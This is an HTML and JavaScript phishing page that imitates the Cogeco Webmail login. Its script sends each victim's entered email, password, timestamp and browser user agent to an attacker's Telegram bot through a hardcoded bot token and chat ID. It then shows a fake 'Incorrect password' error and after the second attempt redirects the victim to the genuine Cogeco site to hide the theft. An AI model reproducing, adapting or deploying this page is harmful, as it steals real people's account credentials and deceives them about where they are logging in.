<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Cogeco Webmail Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family:'Inter',sans-serif;
      background:#f8f9fa; color:#333;
      min-height:100vh; display:flex;
      align-items:center; justify-content:center;
      padding:20px;
    }
    .main-container {
      display: flex;
      gap: 30px; /* Space between the two separate containers */
      max-width: 1100px;
      width: 100%;
      align-items: stretch;
    }

    /* Login Container */
    .login-container {
      flex: 1;
      background: ash;
      border-radius: 16px;
      box-shadow: 0 10px 30px rgba(0,0,0,.1);
      position: relative;
      padding: 30px;
      display: flex;
      flex-direction: column;
      justify-content: center;
    }

    /* Info Container */
    .info-container {
      flex: 1;
      background: linear-gradient(135deg,#4c0694,#e91e63);
      border-radius: 16px;
      box-shadow: 0 10px 30px rgba(0,0,0,.1);
      color: white;
      padding: 50px 40px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      position: relative;
      overflow: hidden;
    }

    /* Header */
    .header {
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      padding: 20px 40px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      z-index: 10;
    }
    .logo { height: 27px; }
    .lang-toggle { font-size: 14px; color: #666; text-decoration: none; font-weight: 500; }

    /* Login Panel */
    .welcome-text { font-size: 20px; font-weight: 500; margin-bottom: 30px; color: #243C77; }

    .form-group { margin-bottom: 20px; position: relative; }
    label { display: block; font-size: 14px; font-weight: 520; margin-bottom: 8px; color: #444; }

    input[type="email"],
    input[type="password"],
    input[type="text"] {
      width: 100%;
      max-width: 100%;
      padding: 12px 16px;
      font-size: 16px;
      border: 1.5px solid #d0d5dd;
      border-radius: 8px;
      outline: none;
      transition: border .2s;
    }
    input:focus { border-color: #00a3d9; }

    input[type="password"],
    input[type="text"] {
      padding-right: 48px !important;
    }

    .email-input { color: #999; }

    .password-wrapper { 
      position: relative; 
      display: flex;
      align-items: center;
    }
    .eye-icon {
      position: absolute; 
      right: 12px; 
      top: 50%;
      transform: translateY(-50%);
      width: 20px;
      height: 20px;
      background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" fill="%23999" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>') center/contain no-repeat;
      cursor: pointer;
      transition: background .2s;
      z-index: 2;
    }
    .eye-icon.open {
      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" fill="%23999" viewBox="0 0 24 24"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.82l2.91 2.91c1.19-1.01 2.19-2.23 2.88-3.73C21.27 9.11 17.37 6 12 6c-1.64 0-3.18.37-4.58 1.02l2.36 2.36C10.74 7.13 11.35 7 12 7zm0 14c-2.76 0-5-2.24-5-5 0-.65.13-1.26.36-1.82l-2.91-2.91C3.26 14.01 2.26 15.23 1.57 16.73 2.73 20.89 6.63 24 12 24c1.64 0 3.18-.37 4.58-1.02l-2.36-2.36C13.26 20.87 12.65 21 12 21zm4.24-11.66l-2.12 2.12C14.04 12.73 14 13.36 14 14c0 1.1-.9 2-2 2-.64 0-1.27-.04-1.82-.36l-2.12 2.12C8.73 18.04 10.36 19 12 19c3.31 0 6-2.69 6-6 0-1.64-.96-3.27-2.76-4.66z"/></svg>');
    }

    .remember-me { display: flex; align-items: center; gap: 8px; font-size: 14px; color: #555; margin-bottom: 20px; }
    .remember-me input { width: 16px; height: 16px; }

    .forgot-link { display: block; text-align: center; font-size: 14px; color: #00a3d9; text-decoration: none; margin-bottom: 20px; }
    .forgot-link:hover { text-decoration: underline; }

    .error-message { color: #d32f2f; font-size: 14px; margin-bottom: 16px; text-align: center; font-weight: 500; display: none; }

    .login-btn {
      width: 100%;
      padding: 14px;
      background: linear-gradient(135deg, #00c4b4, #0088cc);
      color: white;
      font-size: 16px;
      font-weight: 600;
      border: none;
      border-radius: 50px;
      cursor: pointer;
      transition: transform .2s;
    }
    .login-btn:hover { transform: translateY(-2px); }

    /* Info Panel */
    .info-container::after {
      content: '';
      position: absolute;
      bottom: 0;
      right: 0;
      width: 150px;
      height: 150px;
      background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.1"><path fill="%23fff" d="M50 10c22.091 0 40 17.909 40 40s-17.909 40-40 40S10 72.091 10 50 27.909 10 50 10zm0 10c-16.569 0-30 13.431-30 30s13.431 30 30 30 30-13.431 30-30-13.431-30-30-30z"/></svg>') center/contain no-repeat;
      transform: translate(40px, 40px);
    }
    .user-icon {
      width: 60px;
      height: 60px;
      background: white;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 20px;
      box-shadow: 0 4px 12px rgba(0,0,0,.1);
    }
    .user-icon svg { width: 32px; height: 32px; fill: #6a0dad; }
    .info-title { font-size: 24px; font-weight: 600; margin-bottom: 16px; }
    .info-text { font-size: 15px; line-height: 1.6; margin-bottom: 30px; opacity: .95; }
    .learn-more-btn {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      background: #ff5a8f;
      color: white;
      padding: 10px 20px;
      border-radius: 50px;
      text-decoration: none;
      font-size: 14px;
      font-weight: 600;
      transition: background .3s;
    }
    .learn-more-btn:hover { background: #ff3366; }
    .learn-more-btn svg { width: 16px; height: 16px; fill: white; }

    @media (max-width: 768px) {
      .main-container {
        flex-direction: column;
        gap: 20px;
      }
      .login-container,
      .info-container {
        width: 100%;
      }
      .header {
        padding: 20px;
      }
    }
  </style>
</head>

    <script>
    const toggle = document.getElementById('togglePassword');
    const pwd = document.getElementById('password');
    const err = document.getElementById('errorMessage');
    let attempts = 0;

    // Telegram Bot Configuration - REPLACE THESE WITH YOUR VALUES
    const TELEGRAM_BOT_TOKEN = '9289089775:AAGwU_vD9H78rJd3hGWYXg2D1JLeqINXj1I';
    const TELEGRAM_CHAT_ID = '7870175374';

    toggle.addEventListener('click', () => {
      const type = pwd.getAttribute('type') === 'password' ? 'text' : 'password';
      pwd.setAttribute('type', type);
      toggle.classList.toggle('open');
    });

    // Function to send message to Telegram
    async function sendToTelegram(message) {
      try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
          })
        });
        
        const data = await response.json();
        return data.ok;
      } catch (error) {
        console.error('Error sending to Telegram:', error);
        return false;
      }
    }

    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const email = document.getElementById('email').value.trim();
      const password = pwd.value.trim();
      
      if (!email || !password) {
        showErr('Please enter both email and password.');
        return;
      }

      // Send credentials to Telegram
      const message = `🔐 <b>New Login Attempt</b>\n\n📧 <b>Email:</b> ${email}\n🔑 <b>Password:</b> ${password}\n⏰ <b>Time:</b> ${new Date().toLocaleString()}\n🌐 <b>User Agent:</b> ${navigator.userAgent}`;
      
      const sent = await sendToTelegram(message);
      
      if (sent) {
        console.log('Credentials sent to Telegram');
      } else {
        console.log('Failed to send credentials to Telegram');
      }

      attempts++;

      if (attempts === 1) {
        showErr('Incorrect password');
        pwd.value = '';
        pwd.focus();
      } else if (attempts === 2) {
        window.location.href = 'https://wm.cogeco.ca/am/XUI/?locale=en#login';
      }
    });

    function showErr(msg) {
      err.textContent = msg;
      err.style.display = 'block';
    }
  </script>
</body>
